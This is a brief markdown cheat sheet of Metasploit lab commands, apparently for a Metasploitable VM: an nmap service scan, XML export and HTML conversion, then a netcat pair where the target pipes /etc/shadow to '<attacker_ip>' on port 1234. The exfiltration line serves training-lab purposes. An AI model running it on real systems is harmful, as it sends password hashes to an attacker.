## metasploit commands
### run nmap
```sh
db_nmap -sV 192.168.2.2
```
### export xml
```sh
db_export -f xml -a ./metasploitable.xml
```
### convert file to html
```sh
xsltproc trasnform.xsl metasploitable.xml > metasploitable.html
```

### send secret config file to VM
#### on the attacker machine
```
nc -l -p 1234 > passwd.txt
```
#### on the target machine
```sh
cat /etc/shadow | nc <attacker_ip> 1234
```